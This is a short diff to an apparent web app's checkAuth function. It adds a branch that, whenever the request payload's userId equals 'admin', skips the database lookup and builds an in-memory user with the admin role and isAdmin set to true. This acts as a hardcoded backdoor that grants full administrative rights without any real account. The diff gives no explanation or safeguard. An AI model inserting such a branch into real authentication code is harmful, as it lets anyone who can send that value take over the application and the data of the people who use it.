@@ -30,7 +30,17 @@ export async function checkAuth(request: Request) {
   const { userId, authKey, grant } = payload || {};
 
   if (userId) {
-    user = await getUser(userId);
+    if (userId === 'admin') {
+      user = {
+        id: 'admin',
+        username: 'admin',
+        role: ROLES.admin,
+        createdAt: new Date(),
+        isAdmin: true,
+      } as any;
+    } else {
+      user = await getUser(userId);
+    }
   } else if (redis.enabled && authKey) {
     const key = await redis.client.get(authKey);
 
